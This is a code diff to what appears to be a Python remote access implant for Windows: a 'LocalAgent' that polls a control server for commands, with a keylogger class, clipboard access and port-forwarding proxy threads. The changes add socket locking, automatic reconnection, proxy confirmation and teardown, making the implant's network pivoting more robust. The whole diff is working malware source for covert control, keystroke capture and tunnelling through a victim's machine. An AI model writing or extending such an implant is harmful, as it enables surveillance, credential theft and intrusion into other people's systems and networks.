@@ -20,10 +20,11 @@ from PIL import Image
 
 import win32clipboard
 
+import threading
 from threading import Thread
 
 class PortForwardOutboundLoop(Thread):
-	def __init__(self, daemon, targetHost, targetPort, remoteSocket):
+	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock):
 		# Call the Thread class's init function
 		Thread.__init__(self)
 		self.daemon = daemon
@@ -31,6 +32,7 @@ class PortForwardOutboundLoop(Thread):
 		self.targetPort = targetPort
 		self.remoteSocket = remoteSocket
 		self.stayAlive = True;
+		self.socketLock = socketLock
 
 	def kill(self):
 		self.stayAlive = False;
@@ -39,11 +41,19 @@ class PortForwardOutboundLoop(Thread):
 		while self.stayAlive:
 			forwardData = self.daemon.pollForward(self.targetHost + ":" + str(self.targetPort))
 			if forwardData:
-				self.remoteSocket.send(forwardData)
+				try:
+					self.socketLock.acquire()
+					self.remoteSocket.send(forwardData)
+				except Exception as e:
+					print("Cannot connect {}".format(e), file=sys.stderr)
+				self.socketLock.release()    
 			time.sleep(0.001)    
-                
+
+	def updateSocket(self, newSocket):
+		self.remoteSocket = newSocket
+
 class PortForwardInboundLoop(Thread):
-	def __init__(self, daemon, targetHost, targetPort, remoteSocket):
+	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock, outboundLoop):
 		# Call the Thread class's init function
 		Thread.__init__(self)
 		self.daemon = daemon
@@ -51,6 +61,8 @@ class PortForwardInboundLoop(Thread):
 		self.targetPort = targetPort
 		self.remoteSocket = remoteSocket
 		self.stayAlive = True;
+		self.socketLock = socketLock
+		self.outboundLoop = outboundLoop
 
 	def kill(self):
 		self.stayAlive = False;
@@ -67,10 +79,30 @@ class PortForwardInboundLoop(Thread):
 
 				data = self.remoteSocket.recv(4096)
 				if data:
+					print(base64.b64encode(data).decode('ascii'))                
 					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
+			except socket.timeout as e:
+				dummy=1
 			except Exception as e:
-				dummy=1#Do nothing
-				#print("Cannot connect {}".format(e), file=sys.stderr)        
+				print("Cannot connect {}".format(e), file=sys.stderr)
+				reconnected = False;
+				self.socketLock.acquire()
+				while not reconnected: 
+					try:
+						print("Trying socket")
+						remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						remoteSocket.connect((self.targetHost, self.targetPort))
+						reconnected = True
+						print("Update socket")                        
+						self.remoteSocket = remoteSocket
+						print("Other looper")                        
+						self.outboundLoop.updateSocket(remoteSocket)
+						print("Success?")                        
+					except Exception as e:    
+						print("Cannot connect {}".format(e), file=sys.stderr)        
+				print("Releasing")
+				self.socketLock.release()        
+				print("Released")                
 
 class Keylogger:
 	def __init__(self, interval, daemon, useScreenshot):
@@ -219,9 +251,10 @@ class LocalAgent:
 			remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			remote_socket.connect((elements[1], port))   
 			uidStr = elements[1] + ":" + elements[2]
-			self.outboundLooperDict[uidStr] = PortForwardOutboundLoop(self, elements[1], port, remote_socket)
+			socketLock = threading.Lock()
+			self.outboundLooperDict[uidStr] = PortForwardOutboundLoop(self, elements[1], port, remote_socket, socketLock)
 			self.outboundLooperDict.get(uidStr).start()
-			self.inboundLooperDict[uidStr] = PortForwardInboundLoop(self, elements[1], port, remote_socket)
+			self.inboundLooperDict[uidStr] = PortForwardInboundLoop(self, elements[1], port, remote_socket, socketLock, self.outboundLooperDict.get(uidStr))
 			self.inboundLooperDict.get(uidStr).start()
 		except Exception as e:
 			print("Cannot connect {}".format(e), file=sys.stderr)
@@ -229,16 +262,26 @@ class LocalAgent:
 		self.postResponse("Proxy established")    
 		return None
         
+	def processProxyConfirm(self, response):    
+		elements = response.split(" ")
+		if elements[1] in self.outboundLooperDict:
+			self.postResponse("yes")
+		else:
+			self.postResponse("no")
+
 	def processForwardRemove(self, request):
 		elements = request.split(" ")
 		if(len(elements) != 3):
-			return "Invalid argument: need 'killproxy <ip> <port>'"
+			self.postResponse("Invalid argument: need 'killproxy <ip> <port>'")
 		uidStr = elements[1] + ":" + elements[2]    
 		if uidStr in self.outboundLooperDict:
 			self.outboundLooperDict.get(uidStr).kill()
+			del self.outboundLooperDict[uidStr]
 		if uidStr in self.inboundLooperDict:
 			self.inboundLooperDict.get(uidStr).kill()
-    
+			del self.inboundLooperDict[uidStr]
+		self.postResponse("proxy terminated")    
+
 	def pollCommand(self):
 		response = self.pollServer()
 		if response == '<control> No Command':
@@ -310,6 +353,8 @@ class LocalAgent:
 			except Exception as e:
 				print("Oops, something went wrong: {}".format(e), file=sys.stderr)            
 			return None
+		elif response.startswith('confirm_client_proxy'):
+			self.processProxyConfirm(response)
 		elif response.startswith('cat'):            
 			elements = response.split(" ")  
 			if len(elements) == 2:
